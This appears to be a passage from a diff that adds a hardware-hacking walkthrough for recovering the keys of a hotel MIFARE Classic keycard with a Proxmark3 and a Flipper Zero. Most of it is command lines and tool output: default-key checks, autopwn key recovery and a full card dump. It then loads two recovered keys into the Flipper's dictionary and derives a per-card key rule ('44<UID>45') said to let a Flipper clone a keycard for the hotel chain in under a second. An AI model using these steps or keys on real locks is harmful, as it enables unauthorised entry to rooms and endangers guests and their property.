+	[=] proprietary non iso14443-4 card found, RATS not supported
+	[+] Prng detection....... weak
+
+	[?] Hint: try `hf mf` commands
+
+FOUND MIFARE CLASSIC 1K !!
+
+ ,--------------------------.
+(  4.2 : BASIC CRYPTO CHECK  )
+ `--------------------------'
+
+	[usb|script] pm3 --> hf mf fchk
+
+	LIST OF KEYS
+		[+] -----+-----+--------------+---+--------------+----
+		[+]  Sec | Blk | key A        |res| key B        |res
+		[+] -----+-----+--------------+---+--------------+----
+
+	NOT ENCRYPTED - CAN READ [1]
+		[+]  000 | 003 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+		[+]  001 | 007 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+
+	ENCRYPTED, UNKNOWN KEY - CAN'T READ [0]
+		[+]  005 | 023 | ------------ | 0 | ------------ | 0
+		[+]  006 | 027 | ------------ | 0 | ------------ | 0
+
+ ,----------------------------.
+(  4.3 : CHECK FOR KNOWN KEYS  )
+ `----------------------------'
+ 
+	[usb] pm3 --> hf mf fchk
+
+	[+] loaded 61 keys from hardcoded default array
+	[=] Running strategy 1
+	[=] Running strategy 2
+	[=] time in checkkeys (fast) 2.9s
+	
+	
+	[+] found keys:
+	
+	[+] -----+-----+--------------+---+--------------+----
+	[+]  Sec | Blk | key A        |res| key B        |res
+	[+] -----+-----+--------------+---+--------------+----
+	[+]  000 | 003 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+	[+]  001 | 007 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+	[+]  002 | 011 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+	[+]  003 | 015 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+	[+]  004 | 019 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+	[+]  005 | 023 | ------------ | 0 | ------------ | 0
+	[+]  006 | 027 | ------------ | 0 | ------------ | 0
+	[+]  007 | 031 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+	[+]  008 | 035 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+	[+]  009 | 039 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+	[+]  010 | 043 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+	[+]  011 | 047 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+	[+]  012 | 051 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+	[+]  013 | 055 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+	[+]  014 | 059 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+	[+]  015 | 063 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+	[+] -----+-----+--------------+---+--------------+----
+	[+] ( 0:Failed / 1:Success )
+
+	Excellent. We have an unused sector with the (known) default key
+	(actually we have 14 sectors with a total of 28 known keys)
+	
+ ,----------------------.
+(  4.4 : CRACK THE KEYS  )
+ `----------------------'
+
+	Probably the easiest thing to do here, is just run `autopwn` which will try
+	all the various attacks for you in a logical order.
+	
+---
+	But `autopwn` DOES have 'options'
+	
+	[usb] pm3 --> hf mf autopwn --help
+	
+	This command automates the key recovery process on MIFARE Classic cards.
+	It uses the fchk, chk, darkside, nested, hardnested and staticnested to recover keys.
+	If all keys are found, it try dumping card content both to file and emulator memory.
+	
+	usage:
+		hf mf autopwn [-hablv] [-k <hex>]... [-s <dec>] [-f <fn>] [--slow] [--mini]  
+		              [--1k] [--2k] [--4k] [--in] [--im] [--is] [--ia] [--i2] [--i5]
+	
+	options:
+		-h, --help                     This help
+		-k, --key <hex>                Known key, 12 hex bytes
+		-s, --sector <dec>             Input sector number
+		-a                             Input key A (def)
+		-b                             Input key B
+		-f, --file <fn>                filename of dictionary
+		--slow                         Slower acquisition (required by some non standard cards)
+		-l, --legacy                   legacy mode (use the slow `hf mf chk`)
+		-v, --verbose                  verbose output
+		--mini                         MIFARE Classic Mini / S20
+		--1k                           MIFARE Classic 1k / S50 (default)
+		--2k                           MIFARE Classic/Plus 2k
+		--4k                           MIFARE Classic 4k / S70
+		--in                           None (use CPU regular instruction set)
+		--im                           MMX
+		--is                           SSE2
+		--ia                           AVX
+		--i2                           AVX2
+		--i5                           AVX512
+		--i5                           AVX512
+		
+---
+	If there were 0 Keys found by `hf mf chk`, BUT, for some other reason, 
+	you happen to know one of the Keys ...Eg. Sector 3, Key A is 1234567890ABC
+	then give this information to `autopwn`
+
+	[usb] pm3 --> hf mf autopwn -s 3 -a -k 1234567890ABC
+	
+---
+	If you have a good dictionary (Eg. .../proxmark3/client/dictionaries/*)
+	Tell autopwn to use it!
+		
+	[usb] pm3 --> hf mf autopwn -f client/dictionaries/mfc_default_keys.dic
+---
+
+	If you can't be bothered, just run `autopwn` and go make a cuppa.
+	You'll almost certainly get lucky.
+	And if you don't, well, you can re-evaluate your bothered'ness ;)
+
+	[usb] pm3 --> hf mf autopwn
+
+	[!] ⚠️  no known key was supplied, key recovery might fail
+	[+] loaded  5 user keys
+	[+] loaded 61 keys from hardcoded default array
+
+	:::   :::   :::   :::
+	:::   :::   :::   :::
+	:::   :::   :::   :::
+
+	[+] found keys:
+
+	[+] -----+-----+--------------+---+--------------+----
+	[+]  Sec | Blk | key A        |res| key B        |res
+	[+] -----+-----+--------------+---+--------------+----
+	[+]  000 | 003 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+	[+]  001 | 007 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+	[+]  002 | 011 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+	[+]  003 | 015 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+	[+]  004 | 019 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+	[+]  005 | 023 | 44B956203445 | N | 44B956203445 | R
+	[+]  006 | 027 | 44B956203445 | R | 85FCD982EA5A | N
+	[+]  007 | 031 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+	[+]  008 | 035 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+	[+]  009 | 039 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+	[+]  010 | 043 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+	[+]  011 | 047 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+	[+]  012 | 051 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+	[+]  013 | 055 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+	[+]  014 | 059 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+	[+]  015 | 063 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+	[+] -----+-----+--------------+---+--------------+----
+	[=] ( D:Dictionary / S:darkSide / U:User / R:Reused / N:Nested / H:Hardnested / C:statiCnested / A:keyA  )
+
+	[+] Generating binary key file
+	[+] Found keys have been dumped to `/home/prox/hf-mf-99DD1E34-key.bin`
+	[=] --[ FFFFFFFFFFFF ]-- has been inserted for unknown keys where res is 0
+	[=] transferring keys to simulator memory ( ok )
+	[=] dumping card content to emulator memory (Cmd Error: 04 can occur)
+	[=] downloading card content from emulator memory
+	[+] Saved 1024 bytes to binary file `/home/prox/hf-mf-99DD1E34-dump.bin`
+	[+] Saved to json file `/home/prox/hf-mf-99DD1E34-dump.json`
+	[=] autopwn execution time: 37 seconds
+
+ ,---------------------.
+(  4.5 : DUMP THE DATA  )
+ `---------------------'
+
+	[usb|script] pm3 --> hf mf dump
+
+	[=] Using... hf-mf-B9562034-key.bin
+	[+] Loaded binary key file `/home/prox/hf-mf-B9562034-key.bin`
+	[=] Reading sector access bits...
+	[=] .................
+	[+] Finished reading sector access bits
+	[=] Dumping all blocks from card...
+	🕒 Sector... 15 block... 3 ( ok )
+	[+] Succeeded in dumping all blocks
+
+	[+] time: 11 seconds
+
+	[=] -----+-----+-------------------------------------------------+-----------------
+	[=]  sec | blk | data                                            | ascii
+	[=] -----+-----+-------------------------------------------------+-----------------
+	[=]    0 |   0 | B9 56 20 34 FB 08 04 00 01 F2 C7 DA 56 F3 27 1D | .V 4........V.'.
+	[=]      |   1 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+	[=]      |   2 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+	[=]      |   3 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
+	:::     :::   :::                  :::::::: ::                  :::
+	:::     :::   :::                  :::::::: ::                  :::
+	[=]    5 |  20 | 8E 6F 62 6A C0 72 FD 78 2C 17 2E 37 4D ED 5B C3 | .obj.r.x,..7M.[.
+	[=]      |  21 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+	[=]      |  22 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+	[=]      |  23 | 44 B9 56 20 34 45 78 77 88 00 44 B9 56 20 34 45 | D.V 4Exw..D.V 4E
+	
+	[=]    6 |  24 | 01 DE 4D C3 C5 91 27 7A B9 8C E8 60 26 F9 4C 35 | ..M...'z...`&.L5
+	[=]      |  25 | C5 27 45 20 C7 2A 25 E8 B7 42 A5 90 87 3A C5 18 | .'E .*%..B...:..
+	[=]      |  26 | 17 D2 05 80 C7 4A 25 C8 37 22 E5 B0 47 9A 72 AF | .....J%.7"..G.r.
+	[=]      |  27 | 44 B9 56 20 34 45 78 77 88 00 85 FC D9 82 EA 5A | D.V 4Exw.......Z
+	:::     :::   :::                  :::::::: ::                  :::
+	:::     :::   :::                  :::::::: ::                  :::
+	[=]   15 |  60 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+	[=]      |  61 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+	[=]      |  62 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+	[=]      |  63 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
+	[=] -----+-----+-------------------------------------------------+-----------------
+
+	[+] Saved 1024 bytes to binary file `/home/prox/hf-mf-B9562034-dump-001.bin`
+	[+] Saved to json file `/home/prox/hf-mf-B9562034-dump-001.json`
+
+ ,--------------------------------------.
+(  5.1 : MEANWHILE, OVER ON THE FLIPPER  )
+ `--------------------------------------'
+
+	On the SDCard of the flipper, edit: /SDCard/nfc/assets/mf_classic_dict_user.nfc
+
+	Eg. Use qFlipper to pull the file, edit it, and push it back
+	Or: Pull the SDCard out and patch the file (remember to unmount it first)
+
+	File format is:
+		* 1 key per line
+		* Lines starting with '#' are comments
+
+	Add the keys we just found, and push it back
+		44B956203445
+		85FCD982EA5A
+
+Now try the Flipper attack again!
+	Tadah!
+
+ ,--------------------------.
+(  5.2 : IMPROVE THE ATTACK  )
+ `--------------------------'
+
+We have a limited sample set (actually 2, only 1 shown here), but let's assume 
+this Hotel Keycard is perfectly typical of all Keycards issued by this Hotel.
+
+We can now invent a set of rules for use while Red Teaming this Hotel Chain:
+	# We know only Sectors 5 and 6 are in use
+	# We know that Key A+B for Sector 5, AND Key A for Sector 6 is: 44<UID>45
+	# We know the (issuer) Key B is 85FCD982EA5A
+
+So all we REALLY need to do is:
+	# Read the UID
+	# Read Sectors 5 & 6 using the Key: 44<UID>45
+	# Optionally verify that the Issuer Key works (given our small sample set)
+
+We can now clone a Keycard for this Hotel with a Flipper in under a second.
+...assuming your programming skills are good enough to edit the Flipper code ;)
+
+[EOF]
